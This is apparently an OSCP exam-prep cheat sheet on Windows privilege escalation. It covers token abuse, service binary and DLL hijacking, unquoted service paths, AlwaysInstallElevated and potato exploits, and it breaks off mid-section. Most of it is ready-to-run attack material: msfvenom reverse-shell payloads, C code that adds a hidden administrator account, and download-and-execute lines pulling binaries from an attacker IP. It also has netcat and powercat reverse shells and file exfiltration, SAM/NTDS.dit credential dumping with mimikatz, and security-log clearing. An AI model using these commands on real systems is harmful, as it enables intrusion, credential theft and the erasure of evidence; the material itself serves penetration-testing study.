---
title: "OSCP · Élévation de privilèges Windows"
description: "Auditer les services, jetons et configurations d'un poste Windows."
---

# OSCP · Élévation de privilèges Windows

Auditer les services, jetons et configurations d'un poste Windows.


## Énumération

Commandes, paramètres et exemples associés à cette technique.


**Username and Hostname**


```text
whoami
```


**Existing Users**


```powershell
Get-LocalUser
```


**Existing Groups**


```powershell
Get-LocalGroup
```


```text
net localgroup
```


```powershell
Get-LocalGroupMember -GroupName [GroupName]
```


**Operating System, Version, and Architecture**


```text
systeminfo
```


**Network Information**


```text
ipconfig /all
```


```text
route print
```


```text
netstat -ano
```


**Installed Applications**


```powershell
Get-ItemProperty -Path "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*"
```


```sql
Select-Object -Property DisplayName
```


```powershell
Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*"
```


```sql
Select-Object -Property DisplayName
```


**Running Processes**


```powershell
Get-Process
```


```sql
Select-Object -Property ProcessName, Path
```


**Service Accounts**


```powershell
Get-WmiObject -Class Win32_Service | Select-Object Name, StartName
```


**Tâches planifiées**


```powershell
Get-ScheduledTask | Select-Object TaskName, TaskPath, State
```


**Local Administrator Group Members**


```powershell
Get-LocalGroupMember -GroupName "Administrators"
```


**System Drives and Mounted Volumes**


```powershell
Get-PSDrive -PSProvider FileSystem
```


**PowerShell Version**


```text
$PSVersionTable.PSVersion
```


## Recherche de fichiers

Commandes, paramètres et exemples associés à cette technique.


```powershell
Get-ChildItem -Path C:\Users\ -Include *.* -File -Recurse -ErrorAction SilentlyContinue

# Other good foder to heck for things are the web root folders, either Windows or Linux, for example in Windows (C:\inetpub\wwwroot) some config files could have hardcoded strings.
```


```powershell
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
```


```powershell
Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
```


```powershell
Get-ChildItem -Path C:\Users -Include *.bak,*.old,*.tmp -File -Recurse -ErrorAction SilentlyContinue
```


```powershell
Get-ChildItem -Path [Path] -File -Recurse | Where-Object { 
    (Get-Acl $_.FullName).Access | Where-Object { $_.IdentityReference -like "*SYSTEM*" -or $_.IdentityReference -like "*Administrators*" }
}
```


```powershell
Get-ChildItem -Path [Path] -File -Recurse | Where-Object { $_.Length -gt [SizeInBytes] } | Select-Object FullName, Length
```


```bash
Get-ChildItem -Path C:\Users -Include *.exe,*.bat,*.ps1 -File -Recurse -ErrorAction SilentlyContinue
```


```powershell
Get-ChildItem -Path [Path] -Directory -Recurse | Where-Object {
    (Get-Acl $_.FullName).Access | Where-Object { $_.FileSystemRights -like "*Write*" -and $_.IdentityReference -like "*Users*" }
}
```


```text
Runas
```


```powershell
# Replace [Domain\Username] with the target username (e.g., backupadmin). You will be prompted to enter the password for the specified user.
runas /user:[Domain\Username] cmd
```


## PowerShell Goldmine (Logs)

Observer les permissions et la configuration de Windows.


```powershell
Get-History
```


```powershell
(Get-PSReadlineOption).HistorySavePath
```


```powershell
$userProfiles = Get-ChildItem -Path C:\Users -Directory

foreach ($profile in $userProfiles) {
    $historyPath = Join-Path -Path $profile.FullName -ChildPath "AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
    
    if (Test-Path $historyPath) {
        Write-Output "User: $($profile.Name)"
        Write-Output "PSReadline History Path: $historyPath"
        Write-Output "--------------------------------"
        Get-Content -Path $historyPath
        Write-Output ""
    }
}
```


## Abusing Privileges

Commandes, paramètres et exemples associés à cette technique.


### Check Assigned Privileges

Commandes, paramètres et exemples associés à cette technique.


```powershell
whoami /priv
```


### Enable All Tokens

Commandes, paramètres et exemples associés à cette technique.


```powershell
.\EnableAllTokenPrivs.ps1
whoami /priv
```


```powershell
## All Credit goes to Lee Holmes (@Lee_Holmes on twitter).  I found the code here https://www.leeholmes.com/blog/2010/09/24/adjusting-token-privileges-in-powershell/
$definition = @'
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;

namespace Set_TokenPermission
{
    public class SetTokenPriv
    {
        [DllImport("advapi32.dll", ExactSpelling = true, SetLastError = true)]
        internal static extern bool AdjustTokenPrivileges(IntPtr htok, bool disall,
        ref TokPriv1Luid newst, int len, IntPtr prev, IntPtr relen);
        [DllImport("advapi32.dll", ExactSpelling = true, SetLastError = true)]
        internal static extern bool OpenProcessToken(IntPtr h, int acc, ref IntPtr phtok);
        [DllImport("advapi32.dll", SetLastError = true)]
        internal static extern bool LookupPrivilegeValue(string host, string name, ref long pluid);
        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        internal struct TokPriv1Luid
        {
            public int Count;
            public long Luid;
            public int Attr;
        }
        internal const int SE_PRIVILEGE_ENABLED = 0x00000002;
        internal const int SE_PRIVILEGE_DISABLED = 0x00000000;
        internal const int TOKEN_QUERY = 0x00000008;
        internal const int TOKEN_ADJUST_PRIVILEGES = 0x00000020;
        public static void EnablePrivilege()
        {
            bool retVal;
            TokPriv1Luid tp;
            IntPtr hproc = new IntPtr();
            hproc = Process.GetCurrentProcess().Handle;
            IntPtr htok = IntPtr.Zero;

            List<string> privs = new List<string>() {  "SeAssignPrimaryTokenPrivilege", "SeAuditPrivilege", "SeBackupPrivilege",
            "SeChangeNotifyPrivilege", "SeCreateGlobalPrivilege", "SeCreatePagefilePrivilege",
            "SeCreatePermanentPrivilege", "SeCreateSymbolicLinkPrivilege", "SeCreateTokenPrivilege",
            "SeDebugPrivilege", "SeEnableDelegationPrivilege", "SeImpersonatePrivilege", "SeIncreaseBasePriorityPrivilege",
            "SeIncreaseQuotaPrivilege", "SeIncreaseWorkingSetPrivilege", "SeLoadDriverPrivilege",
            "SeLockMemoryPrivilege", "SeMachineAccountPrivilege", "SeManageVolumePrivilege",
            "SeProfileSingleProcessPrivilege", "SeRelabelPrivilege", "SeRemoteShutdownPrivilege",
            "SeRestorePrivilege", "SeSecurityPrivilege", "SeShutdownPrivilege", "SeSyncAgentPrivilege",
            "SeSystemEnvironmentPrivilege", "SeSystemProfilePrivilege", "SeSystemtimePrivilege",
            "SeTakeOwnershipPrivilege", "SeTcbPrivilege", "SeTimeZonePrivilege", "SeTrustedCredManAccessPrivilege",
            "SeUndockPrivilege", "SeUnsolicitedInputPrivilege", "SeDelegateSessionUserImpersonatePrivilege" };


            

            retVal = OpenProcessToken(hproc, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, ref htok);
            tp.Count = 1;
            tp.Luid = 0;
            tp.Attr = SE_PRIVILEGE_ENABLED;

            foreach (var priv in privs)
            {
                retVal = LookupPrivilegeValue(null, priv, ref tp.Luid);
                retVal = AdjustTokenPrivileges(htok, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);                              
            }
        }
    }  
}
'@

$type = Add-Type $definition -PassThru
$type[0]::EnablePrivilege() 2>&1
```


### Token Privileges Table

Commandes, paramètres et exemples associés à cette technique.


**SeAssignPrimaryToken**


```text
SeAssignPrimaryToken
```


**SeAudit**


```text
SeAudit
```


```text
Authz Report Security Event
```


**SeBackup**


```text
SeBackup
```


```text
HKLM\SAM
```


```text
HKLM\SYSTEM
```


```text
SAM
```


```text
Administrators
```


```text
SeBackupPrivilege
```


**SeBackup**


```text
SeBackup
```


```text
SeRestore
```


```text
HKLM\SAM
```


```text
HKLM\SYSTEM
```


```text
cmd /c "reg save HKLM\SAM SAM & reg save HKLM\SYSTEM SYSTEM"
```


```text
SAM
```


```text
Impacket
```


```text
secretsdump.py
```


```text
secretsdump.py -sam SAM -system SYSTEM LOCAL
```


```text
Administrator
```


```text
Administrators
```


```text
NTLM
```


```text
Impacket
```


```text
psexec.py
```


```text
psexec.py -hashes ":<ADMINISTRATOR_NTLM>" <Administrator>@<TARGET_IP>
```


```text
robocopy /b
```


```text
User Account Control
```


```text
Administrator
```


```text
FilterAdministratorToken
```


```text
SMB
```


```text
SMB
```


```text
NetBIOS
```


```text
WinRM
```


```text
RDP
```


```text
Restricted Admin
```


```text
%WINDIR%\MEMORY.DMP
```


```text
SeBackupPrivilege
```


```text
SeBackup
```


```text
SeRestore
```


```text
/b
```


```text
Backup Operators
```


```text
Copy-FileSeBackupPrivilege
```


```text
SeBackup
```


```powershell
Import-Module .\SeBackupPrivilegeUtils.dll
```


```powershell
Import-Module .\SeBackupPrivilegeCmdLets.dll
```


```powershell
Set-SeBackupPrivilege
```


```text
Copy-FileSeBackupPrivilege <SOURCE_FILE> <DEST_FILE>
```


**SeChangeNotify**


```text
SeChangeNotify
```


**SeCreateGlobal**


```text
SeCreateGlobal
```


**SeCreatePagefile**


```text
SeCreatePagefile
```


**SeCreatePermanent**


```text
SeCreatePermanent
```


**SeCreateSymbolicLink**


```text
SeCreateSymbolicLink
```


**SeCreateToken**


```text
SeCreateToken
```


```text
NtCreateToken
```


**SeDebug**


```text
SeDebug
```


```text
lsass.exe
```


**SeDelegateSession- UserImpersonate**


```text
SeDelegateSession-
```


```text
UserImpersonate
```


**SeEnableDelegation**


```text
SeEnableDelegation
```


**SeImpersonate**


```text
SeImpersonate
```


```text
SeAssignPrimaryToken
```


**SeIncreaseBasePriority**


```text
SeIncreaseBasePriority
```


```text
start /realtime SomeCpuIntensiveApp.exe
```


**SeIncreaseQuota**


```text
SeIncreaseQuota
```


**SeIncreaseWorkingSet**


```text
SeIncreaseWorkingSet
```


**SeLoadDriver**


```text
SeLoadDriver
```


```text
szkg64.sys
```


```text
fltMC
```


```text
fltMC sysmondrv
```


```text
szkg64
```


```text
szkg64
```


**SeLockMemory**


```text
SeLockMemory
```


**SeMachineAccount**


```text
SeMachineAccount
```


**SeManageVolume**


```text
SeManageVolume
```


```text
SYNCHRONIZE | FILE_TRAVERSE
```


```text
FSCTL_SD_GLOBAL_CHANGE
```


```text
S-1-5-32-544
```


```text
S-1-5-32-545
```


```text
FSCTL_SD_GLOBAL_CHANGE
```


**SeProfileSingleProcess**


```text
SeProfileSingleProcess
```


**SeRelabel**


```text
SeRelabel
```


```text
SeRelabel
```


```text
WRITE_OWNER
```


**SeRemoteShutdown**


```text
SeRemoteShutdown
```


```text
shutdown /s /f /m \\server1 /d P:5:19
```


**SeReserveProcessor**


```text
SeReserveProcessor
```


**SeRestore**


```text
SeRestore
```


**SeSecurity**


```text
SeSecurity
```


```text
wevtutil cl Security
```


```text
wevtutil sl Security /ms:0
```


**SeShutdown**


```text
SeShutdown
```


```text
shutdown.exe /s /f /t 1
```


**SeSyncAgent**


```text
SeSyncAgent
```


**SeSystemEnvironment**


```text
SeSystemEnvironment
```


```text
NtSetSystemEnvironmentValue
```


```text
NtModifyDriverEntry
```


**SeSystemProfile**


```text
SeSystemProfile
```


**SeSystemtime**


```text
SeSystemtime
```


```text
cmd.exe /c date 01-01-01
```


```text
cmd.exe /c time 00:00
```


```text
SeSystemTime
```


**SeTakeOwnership**


```text
SeTakeOwnership
```


```text
takeown.exe /f "%windir%\system32"
```


```text
icacls.exe "%windir%\system32" /grant "%username%":F
```


**SeTcb**


```text
SeTcb
```


**SeTimeZone**


```text
SeTimeZone
```


```text
tzutil /s "Chatham Islands Standard Time"
```


**SeTrustedCredManAccess**


```text
SeTrustedCredManAccess
```


**SeUndock**


```text
SeUndock
```


**SeUnsolicitedInput**


```text
SeUnsolicitedInput
```


### FullPowers.exe

Commandes, paramètres et exemples associés à cette technique.


```text
FullPowers.exe
```


```text
SeAssignPrimaryToken
```


```text
SeImpersonate
```


```bash
python3 -m http.server 80
```


![Initial Privileges of the Service Account.](https://www.emmanuelsolis.com/img/fullpowers_1.png)


```powershell
# CMD
cerutil.exe -urlcache -split -f http://[kali_ip]/FullPowers.exe

# PowerShell
iwr -uri http://[kali_ip]/FullPowers.exe -O FullPowers.exe
```


![Downloading FullPowers.exe to victim machine.](https://www.emmanuelsolis.com/img/fullpowers_2.png)


```text
FullPowers.exe
```


```powershell
# Basic Usage
./FullPowers.exe

# Trying to get an extended set of privileges (might fail with NETWORK SERVICE)
./FullPowers.exe -x

# Specify a command line to run
./FullPowers.exe -c "powershell -ep Bypass"

# Start a reverse shell to the attacker machine (requires that you previously bring Netcat to the victim)
./FullPowers.exe -c "C:\Temp\nc64.exe [kali_ip] [port] -e cmd" -z
```


![Running FullPowers.exe.](https://www.emmanuelsolis.com/img/fullpowers_3.png)


```text
FullPowers.exe
```


```powershell
whoami /priv
```


![Verifying our New Restored Privileges.](https://www.emmanuelsolis.com/img/fullpowers_4.png)


```text
SeImpersonate
```


```text
PrintSpoofer.exe
```


```text
GodPotato.exe
```


![Executing Malicious Actions.](https://www.emmanuelsolis.com/img/fullpowers_5.png)


## Service Binary Hijacking

Commandes, paramètres et exemples associés à cette technique.


### Basic and Main Checks

Commandes, paramètres et exemples associés à cette technique.


```powershell
# Tip: Look for services with paths outside of `system32` or other unexpected locations.; try to find that thing that seems out of place.
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -eq 'Running'}
```


```powershell
icacls "C:\Path\To\ServiceBinary.exe"
```


```powershell
Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -eq '<ServiceName>'}
```


```text
#include <stdlib.h>

int main ()
{
  system("net user emma Password123! /add");
  system("net localgroup administrators emma /add");
  return 0;
}
```


```bash
# Cross-Compile the C Code to a 64-bit Application
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
```


```bash
# For 64-bit executable
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<Your_IP> LPORT=<Your_Port> -f exe -o reverse_shell.exe

# For 32-bit executable
msfvenom -p windows/shell_reverse_tcp LHOST=<Your_IP> LPORT=<Your_Port> -f exe -o reverse_shell.exe
```


```bash
msfvenom
```


```powershell
# Remember to run the HTTP server on your Kali to be able to bring the binary.
iwr -uri http://<attacker-ip>/adduser.exe -Outfile adduser.exe

move "C:\Path\To\ServiceBinary.exe" "C:\Path\To\Backup\ServiceBinary.exe"

move .\adduser.exe "C:\Path\To\ServiceBinary.exe"
```


```powershell
Restart-Service -Name '<ServiceName>'
```


```text
sc.exe
```


```powershell
sc.exe stop <ServiceName>
sc.exe start <ServiceName>
```


```powershell
# First check for reboot privileges: SeShutdownPrivilege should be Assigned and Enabled.
whoami /priv

# Perform the restart
shutdown /r /t 0
```


### Additional Optional Checks

Commandes, paramètres et exemples associés à cette technique.


```bash
cp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 .
python3 -m http.server 80
```


```powershell
iwr -uri http://<attacker-ip>/PowerUp.ps1 -Outfile PowerUp.ps1

powershell -ep bypass
. .\PowerUp.ps1

Get-ModifiableServiceFile

Install-ServiceBinary -Name '<ServiceName>'
```


```powershell
$ModifiableFiles = echo 'C:\Path\To\ServiceBinary.exe' | Get-ModifiablePath -Literal
```


```powershell
Get-CimInstance -ClassName win32_service | Select Name, PathName | ForEach-Object {
    $path = $_.PathName -replace '"', ''
    if (Test-Path $path) {
        icacls $path
    }
}
```


```powershell
# List service dependencies
Get-CimInstance -ClassName win32_service | Select Name, PathName, DependentServices | Where-Object {$_.DependentServices -ne $null}
```


```powershell
# Some services use configuration files that can be hijacked similarly to service binaries. Example: Checking permissions on a configuration file
icacls "C:\Path\To\Service\ConfigFile.ini"
```


```text
impacket-tool
```


```bash
strings [downloaded_binary]

flare-floss [downloaded_binary]

# Use dnSpy if you know that the binary was built using .NET.

# You could also use tools like PEiD, IDA Pro, or Ghidra to analyze the binary (this is not recommended because the exam is usually not that complex and you could be going into a rabbit hole).
```


```powershell
Get-WinEvent -LogName System | Where-Object {$_.Message -like "*<ServiceName>*"}
```


```powershell
# Check for system update settings that might revert changes
Get-WindowsUpdateLog
```


## Service DLL Hijacking

Commandes, paramètres et exemples associés à cette technique.


```text
C:\Windows\System32
```


```text
C:\Windows\System32\System
```


```text
C:\Windows
```


```text
PATH
```


```text
ProcMon
```


```text
depends.exe
```


```powershell
# List running services and their executable paths
Get-CimInstance -ClassName win32_service | Select Name, State, PathName | Where-Object {$_.State -like 'Running'}
```


```text
PATH
```


```powershell
# Display the PATH environment variable
$env:path
```


```text
#include <windows.h>

BOOL APIENTRY DllMain(
    HMODULE hModule,       // Handle to DLL module
    DWORD ul_reason_for_call, // Reason for calling function
    LPVOID lpReserved      // Reserved
) {
    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
        // Execute system commands to add a new user and grant admin rights
        system("net user emma Password123! /add");
        system("net localgroup administrators emma /add");
    }
    return TRUE;
}
```


```bash
# Cross-Compile the DLL
x86_64-w64-mingw32-gcc DLLMain.cpp --shared -o DLLMain.dll
```


```bash
# For 64-bit DLL
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<Your_IP> LPORT=<Your_Port> -f dll -o reverse_shell.dll

# For 32-bit DLL
msfvenom -p windows/shell_reverse_tcp LHOST=<Your_IP> LPORT=<Your_Port> -f dll -o reverse_shell.dll
```


```bash
msfvenom
```


```powershell
# Bring the file from your Kali using an HTTP server

# Move the original DLL (back it up if necessary)
move "C:\path\to\original\DLL.dll" "C:\path\to\backup\DLL.dll"

# Replace it with your malicious DLL
move "C:\path\to\malicious\myDLL.dll" "C:\path\to\service\DLL.dll"

# Restart the service
Restart-Service -Name "[serviceToHijack]"
```


```powershell
# List users to check if the new user was added
net user

# List local administrators to verify if the new user is an admin
net localgroup administrators
```


```powershell
# Display the PATH environment variable
$env:path
```


## Unquoted Service Paths

Commandes, paramètres et exemples associés à cette technique.


```powershell
wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """
```


```text
C:\Program Files\MyApp\app.exe
```


```text
C:\Program Files\MyApp\app.exe
```


```text
.exe
```


```text
C:\Program.exe
```


```text
C:\Program Files\MyApp.exe
```


```text
C:\Program Files\MyApp\app.exe
```


```text
C:\Program Files\
```


```text
app.exe
```


```text
C:\Program Files\ExampleApp\ExampleService.exe
```


```text
C:\Program.exe
```


```powershell
icacls "<PathToDirectory>"
```


```powershell
# Download PowerUp script
iwr http://<YourServerIP>/PowerUp.ps1 -Outfile PowerUp.ps1

# Bypass execution policy and run the script
powershell -ep bypass
. .\PowerUp.ps1

# List unquoted service paths
Get-UnquotedService
```


```powershell
# Create the binary from Kali, could be any program, for example a reverse shell, or a program that adds a new user.

# Replace service binary with malicious executable (Manually)
copy <malicious_file> "C:\Program Files\ExampleApp\Current.exe"

# Replace service binary with malicious executable (with PowerUp)
Write-ServiceBinary -Name '<ServiceName>' -Path '<PathToMaliciousExecutable>'

# Restart the service
Restart-Service <ServiceName>

# Verify the service status
Get-Service -Name '<ServiceName>'

# Check event logs for service-related events
Get-WinEvent -LogName System | Where-Object {$_.Id -eq 7036 -and $_.Message -like "*<ServiceName>*"}
```


## Tâches planifiées

Commandes, paramètres et exemples associés à cette technique.


```powershell
schtasks /query /fo LIST /v
```


```powershell
icacls "C:\Path\To\ScheduledTaskExecutable.exe"
```


```powershell
iwr -Uri http://<attacker-ip>/malicious.exe -Outfile malicious.exe

move C:\Path\To\TargetDirectory\Executable.exe C:\Path\To\Backup\OriginalExecutable.bak

move .\malicious.exe C:\Path\To\TargetDirectory\Executable.exe
```


## Internal Services

Commandes, paramètres et exemples associés à cette technique.


### Display Active Network Connections

Commandes, paramètres et exemples associés à cette technique.


```bash
netstat -ano

# Example output:
Proto  Local address      Remote address     State        PID
tcp    0.0.0.0:21         0.0.0.0:*          LISTEN       -
tcp    0.0.0.0:5900       0.0.0.0:*          LISTEN       -
tcp    192.168.1.9:139    192.168.1.9:32874  TIME_WAIT    -
tcp    127.0.0.1:445      127.0.0.1:1159     ESTABLISHED  -
udp    0.0.0.0:135        0.0.0.0:*                       -
udp    192.168.1.9:500    0.0.0.0:*                       -
```


### Types of Addresses

Commandes, paramètres et exemples associés à cette technique.


## Cleartext Password Finding

Vérifier les comptes, les secrets et les mécanismes d'authentification.


### Using Findstr

Commandes, paramètres et exemples associés à cette technique.


```bash
findstr /si password *.txt
findstr /si password *.xml
findstr /si password *.ini
```


### Searching in Configuration Files

Commandes, paramètres et exemples associés à cette technique.


```bash
dir /s *pass* == *cred* == *vnc* == *.config*
```


### Searching in All Files

Commandes, paramètres et exemples associés à cette technique.


```bash
findstr /spin "password" *.*
findstr /spin "password" *.*
```


### Check Specific Files

Commandes, paramètres et exemples associés à cette technique.


```bash
c:\sysprep.inf
c:\sysprep\sysprep.xml
c:\unattend.xml
%WINDIR%\Panther\Unattend\Unattended.xml
%WINDIR%\Panther\Unattended.xml
```


### Searching for VNC Fichiers de mots de passe

Commandes, paramètres et exemples associés à cette technique.


```bash
dir c:\*vnc.ini /s /b
dir c:\*ultravnc.ini /s /b 
dir c:\ /s /b | findstr /si *vnc.ini
```


## Shadow Copies (SAM, SYSTEM, NTDS.dit, SECURITY, NTUSER.dat)

Commandes, paramètres et exemples associés à cette technique.


```text
Windows.Old
```


```text
SYSTEM
```


```text
SAM
```


```text
NTDS.dit
```


```text
SECURITY
```


```text
NTUSER.dat
```


```text
C:\Windows\System32\SAM
```


```text
C:\windows.old\Windows\System32\SAM
```


```text
impacket-tool
```


### Key Files to Target

Commandes, paramètres et exemples associés à cette technique.


### Dumping SAM and SYSTEM Files

Commandes, paramètres et exemples associés à cette technique.


```powershell
reg save hklm\sam <destination_path>\sam
```


```powershell
reg save hklm\system <destination_path>\system
```


```bash
samdump2 <system_file> <sam_file>
or
impacket-secretsdump -sam <sam_file> -system <system_file> LOCAL
```


```powershell
mimikatz # lsadump::sam /sam:"<sam_file>" /system:"<system_file>"
```


### Accessing NTDS.dit (Active Directory Database)

Examiner les objets, les droits et les services du domaine.


```powershell
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy<ShadowCopyID>\windows\ntds\ntds.dit <destination_path>\ntds.dit.bak
```


```powershell
reg.exe save hklm\system <destination_path>\system.bak
```


```bash
impacket-secretsdump -ntds <ntds_dit_backup> -system <system_backup> LOCAL
```


```powershell
mimikatz # lsadump::ntds /ntds:"<ntds_dit_backup>" /system:"<system_backup>"
```


### Dumping SECURITY Hive for LSA Secrets & Cached Credentials

Vérifier les comptes, les secrets et les mécanismes d'authentification.


```powershell
reg save hklm\security <destination_path>\security
```


```powershell
reg save hklm\system <destination_path>\system
```


```bash
impacket-secretsdump -security <security_file> -system <system_file> LOCAL
```


```powershell
mimikatz # lsadump::secrets /security:"<security_file>" /system:"<system_file>"
```


### Extracting User-Specific Credentials from NTUSER.dat

Vérifier les comptes, les secrets et les mécanismes d'authentification.


```text
NTUSER.dat
```


```text
NTUSER.dat
```


```text
C:\Users\<username>\NTUSER.dat
```


```powershell
reg load hku\TempHive <path_to_ntuser.dat>
```


### General Volume Shadow Copy Access

Commandes, paramètres et exemples associés à cette technique.


```powershell
vssadmin list shadows
```


```powershell
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy<ShadowCopyID>\<path_to_file> <destination_path>
```


## AlwaysElevated Registry Check

Observer les permissions et la configuration de Windows.


```text
HKEY_LOCAL_MACHINE
```


```text
HKEY_CURRENT_USER
```


```text
1
```


### How to Check for the Vulnerability

Commandes, paramètres et exemples associés à cette technique.


```powershell
# Check in HKEY_LOCAL_MACHINE for system-wide policy
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated

# Check in HKEY_CURRENT_USER for user-specific policy
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
```


### Interpreting the Results

Commandes, paramètres et exemples associés à cette technique.


```text
1
```


```text
1
```


### Exploiting the Vulnerability

Commandes, paramètres et exemples associés à cette technique.


```text
1
```


```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<your_ip> LPORT=<your_port> -f msi -o malicious.msi
```


```bash
# Using Netcat
nc -lvnp <your_port>

# Using Metasploit (forbidden in the exam)
msfconsole
use exploit/multi/handler
set payload windows/x64/shell_reverse_tcp
set LHOST <your_ip>
set LPORT <your_port>
run
```


```text
msiexec
```


```bash
# If the payload is a reverse shell, it could maybe work by just executing the .msi, try it; otherwise just use below steps
./malicious.msi

# This will install and execute the malicious MSI with system-level permissions, allowing you to escalate your privileges.
msiexec /quiet /qn /i malicious.msi

# The /quiet and /qn flags ensure that the installation runs silently without user interaction
# The /i flag specifies that you're installing the MSI package.
```


## Scripts

Commandes, paramètres et exemples associés à cette technique.


### WinPEAS

Commandes, paramètres et exemples associés à cette technique.


```powershell
.\winPEAS.ps1
```


```powershell
.\winPEAS.ps1 | tee winpeas_output.txt
```


```powershell
.\winPEAS.ps1 | Out-File -FilePath winpeas_output.txt
```


```powershell
# 1. Download file from victim to local Kali, we could use techniques from section 17.

# 2. Convert .txt to .json.
python3 peas2json.py ./winpeas_output.txt peass.json

# 3. Convert .json to .html.
python3 json2html.py peass.json peass.html

# (Optional) We could also convert it to PDF.
python3 json2pdf.py peass.json peass.pdf
```


```powershell
Get-Content winpeas_output.txt | ConvertTo-Html | Out-File winpeas_output.html
```


### PowerUp

Commandes, paramètres et exemples associés à cette technique.


```powershell
.\powerup.ps1
```


```powershell
.\PowerUp.ps1 -CheckMissingPatches
```


```powershell
.\PowerUp.ps1 -UnquotedServicePaths
```


```powershell
.\PowerUp.ps1 -CheckWritableServices
```


```powershell
.\PowerUp.ps1 -ScheduledTasks
```


```powershell
.\PowerUp.ps1 -WeakFilePermissions
```


```powershell
.\PowerUp.ps1 -AutoDownloadBinaries
```


### PowerCat

Commandes, paramètres et exemples associés à cette technique.


```powershell
.\powercat.ps1 -c [target_IP] -p [port] -e [command]
```


```powershell
.\powercat.ps1 -c [attacker_IP] -p [port] -e powershell.exe
```


```powershell
.\powercat.ps1 -c [ATTACKER_IP] -p [PORT] -f [FILE_TO_SEND]
```


```powershell
.\powercat.ps1 -c [TARGET_IP] -p [PORT] -s
```


### PowerView

Commandes, paramètres et exemples associés à cette technique.


```powershell
.\PowerView.ps1
or
powershell -ExecutionPolicy bypass
Import-Module ./PowerView.ps1
```


```powershell
.\PowerView.ps1 -Command "Get-NetUser"
```


```powershell
.\PowerView.ps1 -Command 'Get-NetGroup -GroupName "Domain Admins"'
```


```powershell
.\PowerView.ps1 -Command 'Get-NetUser -SPN'
```


```powershell
.\PowerView.ps1 -Command 'Get-NetDomainController'
```


```powershell
.\PowerView.ps1 -Command 'Get-NetShare'
```


```powershell
.\PowerView.ps1 -Command 'Get-NetUser -Delegation'
```


### PowerMad

Commandes, paramètres et exemples associés à cette technique.


```powershell
.\PowerMad.ps1
```


```powershell
.\PowerMad.ps1 -Command "Get-DomainAdminGroup"
```


```powershell
.\PowerMad.ps1 -Command "Get-DomainAdminGroup" | Out-File -FilePath powermad_output.txt
```


### PrivescCheck

Commandes, paramètres et exemples associés à cette technique.


```powershell
.\PrivescCheck.ps1
```


```powershell
.\PrivescCheck.ps1
```


```powershell
.\PrivescCheck.ps1 | Out-File -FilePath privesccheck_output.txt
```


### Seatbelt

Commandes, paramètres et exemples associés à cette technique.


```powershell
.\Seatbelt.exe
```


### PowerSharpPack

Commandes, paramètres et exemples associés à cette technique.


#### Setup

Commandes, paramètres et exemples associés à cette technique.


```bash
git clone https://github.com/S3cur3Th1sSh1t/PowerSharpPack
cd PowerSharpPack
```


```powershell
iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpPack.ps1')
```


```text
-Command
```


```powershell
PowerSharpPack -seatbelt -Command "AMSIProviders"
```


#### Included Tools and Code Examples

Commandes, paramètres et exemples associés à cette technique.


```powershell
PowerSharpPack -InternalMonologue
```


```powershell
PowerSharpPack -seatbelt -Command "AMSIProviders"
```


```powershell
PowerSharpPack -SharpWeb
```


```powershell
PowerSharpPack -UrbanBishop
```


```powershell
PowerSharpPack -SharpUp
```


```powershell
PowerSharpPack -Rubeus -Command "kerberoast /outfile:Roasted.txt"
```


```powershell
PowerSharpPack -SharPersist -Command "Persist"
```


```powershell
PowerSharpPack -SharpView -Command "Get-Domain"
```


```powershell
PowerSharpPack -winPEAS
```


```powershell
PowerSharpPack -SharpChromium
```


#### Standalone Scripts

Commandes, paramètres et exemples associés à cette technique.


```text
PowerSharpBinaries
```


```powershell
PowerSharpPack -SharpCloud
```


```powershell
PowerSharpPack -SharpGPOAbuse
```


```powershell
PowerSharpPack -SauronEye
```


#### Additional Tools

Commandes, paramètres et exemples associés à cette technique.


```powershell
PowerSharpPack -SharpShares
```


```powershell
PowerSharpPack -SharpSniper
```


```powershell
PowerSharpPack -SharpSpray
```


```powershell
PowerSharpPack -Grouper2
```


```powershell
PowerSharpPack -Watson
```


#### Execution Tips

Commandes, paramètres et exemples associés à cette technique.


```powershell
PowerSharpPack -Rubeus -Command "kerberoast /outfile:roasted.txt /domain:example.com"
```


```text
PowerSharpBinaries
```


## Potatoes

Commandes, paramètres et exemples associés à cette technique.


```text
whoami /priv
```


```text
winPEAS
```


```text
NT AUTHORITY\SYSTEM
```


```text
PrintSpoofer
```


### DCOMPotato

Commandes, paramètres et exemples associés à cette technique.


```bash
DCOMPotato.exe -c "C:\Windows\System32\cmd.exe"
```


```bash
DCOMPotato.exe -c "C:\Windows\System32\nc.exe -e cmd.exe [ATTACKER_IP] 4444"
```


```bash
# Creates the new user
DCOMPotato.exe -c "C:\Windows\System32\net.exe user emma Password123 /add"

# Adds it as admin
DCOMPotato.exe -c "C:\Windows\System32\net.exe localgroup Administrators emma /add"
```


### EfsPotato

Commandes, paramètres et exemples associés à cette technique.


```bash
EfsPotato.exe "C:\Windows\System32\cmd.exe"
```


```bash
EfsPotato.exe -c "C:\Windows\System32\nc.exe -e cmd.exe [ATTACKER_IP] 4444"
```


```bash
# Creates the new user
EfsPotato.exe -c "C:\Windows\System32\net.exe user emma Password123 /add"

# Adds it as admin
